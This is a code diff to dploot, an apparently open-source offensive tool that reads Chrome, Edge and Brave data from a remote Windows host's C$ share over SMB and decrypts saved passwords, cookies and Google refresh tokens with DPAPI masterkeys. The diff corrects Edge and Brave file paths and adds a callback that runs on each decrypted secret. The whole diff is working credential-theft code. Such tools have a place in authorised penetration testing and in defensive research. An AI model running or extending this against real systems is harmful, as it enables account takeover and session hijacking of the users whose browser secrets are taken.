@@ -4,7 +4,7 @@ import logging
 import ntpath
 import tempfile
 import sqlite3
-from typing import List, Tuple
+from typing import Any, List, Tuple
 from dploot.lib.crypto import decrypt_chrome_password
 
 from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
@@ -90,7 +90,7 @@ class BrowserTriage:
     user_msedge_generic_login_path = {
         'aesStateKeyPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State',
         'loginDataPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
-        'webDataPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data',
+        'webDataPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data',
         'cookiesDataPath':[
             'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies',
             'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies'
@@ -99,7 +99,7 @@ class BrowserTriage:
     user_brave_generic_login_path = {
         'aesStateKeyPath':'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State',
         'loginDataPath':'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data',
-        'webDataPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data',
+        'webDataPath':'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Web Data',
         'cookiesDataPath':[
             'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies',
             'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies'
@@ -113,13 +113,15 @@ class BrowserTriage:
 
     share = 'C$'
 
-    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey]) -> None:
+    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey], per_secret_callback: Any = None) -> None:
         self.target = target
         self.conn = conn
         
         self._users = None
         self.looted_files = dict()
         self.masterkeys = masterkeys
+
+        self.per_secret_callback = per_secret_callback
 
     def triage_browsers(self, gather_cookies:bool = False, bypass_shared_violation:bool = False) -> Tuple[List[LoginData], List[Cookie]]:
         credentials = list()
@@ -170,12 +172,15 @@ class BrowserTriage:
                 if len(lines) > 0:
                     for url, username, encrypted_password in lines:
                         password = decrypt_chrome_password(encrypted_password, aeskey)
-                        credentials.append(LoginData(
+                        login_data_decrypted = LoginData(
                             winuser=user, 
                             browser=browser, 
                             url=url, 
                             username=username, 
-                            password=password))
+                            password=password)
+                        credentials.append(login_data_decrypted)
+                        if self.per_secret_callback is not None:
+                            self.per_secret_callback(login_data_decrypted)
                 fh.close()
             if gather_cookies:
                 for cookiepath in paths['cookiesDataPath']:
@@ -191,17 +196,20 @@ class BrowserTriage:
                         lines = query.fetchall()
                         if len(lines) > 0:
                             for creation_utc, host, name, path, expires_utc, last_access_utc, encrypted_cookie in lines:
-                                cookie = decrypt_chrome_password(encrypted_cookie, aeskey)
-                                cookies.append(Cookie(
+                                decrypted_cookie_value = decrypt_chrome_password(encrypted_cookie, aeskey)
+                                cookie = Cookie(
                                     winuser=user,
                                     browser=browser,
                                     host=host,
                                     path=path,
                                     cookie_name=name,
-                                    cookie_value=cookie,
+                                    cookie_value=decrypted_cookie_value,
                                     creation_utc=creation_utc,
                                     expires_utc=expires_utc,
-                                    last_access_utc=last_access_utc))
+                                    last_access_utc=last_access_utc)
+                                cookies.append(cookie)
+                                if self.per_secret_callback is not None:
+                                    self.per_secret_callback(cookie)
                         fh.close()
             webData_bytes = self.conn.readFile(shareName=self.share, path=paths['webDataPath'] % user, bypass_shared_violation=bypass_shared_violation)
             if aeskey is not None and webData_bytes is not None and len(webData_bytes) > 0:
@@ -215,12 +223,15 @@ class BrowserTriage:
                 if len(lines) > 0:
                     for service, encrypted_grt in lines:
                         token = decrypt_chrome_password(encrypted_grt, aeskey)
-                        credentials.append(GoogleRefreshToken(
+                        google_refresh_token = GoogleRefreshToken(
                             winuser=user,
                             browser=browser,
                             service=service,
                             token = token
-                        ))
+                        )
+                        credentials.append(google_refresh_token)
+                        if self.per_secret_callback is not None:
+                            self.per_secret_callback(google_refresh_token)
         return credentials, cookies
 
     @property
